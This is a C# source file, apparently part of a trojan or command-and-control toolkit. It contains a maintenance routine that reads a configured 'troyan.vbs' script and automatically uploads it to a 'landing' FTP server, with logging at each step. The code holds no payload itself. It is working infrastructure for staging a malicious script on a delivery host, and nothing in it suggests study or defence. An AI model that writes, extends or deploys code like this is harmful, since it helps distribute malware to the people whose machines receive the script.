using Commons;
using Microsoft.Extensions.Logging;
using model;

namespace LandingFtp;

public sealed class LandingFtpMaintenance : ILandingFtpMaintenance
{
    private readonly ServerService _serverService;
    private readonly ILogger<LandingFtpMaintenance> _logger;

    public LandingFtpMaintenance(ServerService serverService, ILogger<LandingFtpMaintenance> logger)
    {
        _serverService = serverService;
        _logger = logger;
    }

    public Task RunAsync(CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        return Task.Run(() =>
        {
            cancellationToken.ThrowIfCancellationRequested();

            ServerModel? server;
            try
            {
                server = _serverService.GetServerHard().ServerModel;
            }
            catch (Exception ex)
            {
                _logger.LogWarning(ex, "Landing FTP skipped: failed to load server.");
                return;
            }

            if (server is null || !server.LandingAuto || string.IsNullOrWhiteSpace(server.LandingFtp))
            {
                _logger.LogTrace("Landing FTP skipped (LandingAuto false or LandingFtp empty).");
                return;
            }

            var layout = _serverService.Layout();
            var vbs = layout.UserTroyanVbs;
            if (!File.Exists(vbs))
            {
                _logger.LogWarning("Landing FTP skipped; file missing: {Path}", vbs);
                return;
            }

            try
            {
                var uri = new Uri(server.LandingFtp.Trim(), UriKind.Absolute);
                LandingFtpUploader.UploadFile(uri, vbs, "troyan.vbs");
                _logger.LogInformation("Landing FTP uploaded troyan.vbs to {Scheme}://{Host}{Path}", uri.Scheme, uri.Host, uri.AbsolutePath);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Landing FTP upload failed.");
            }
        }, cancellationToken);
    }
}
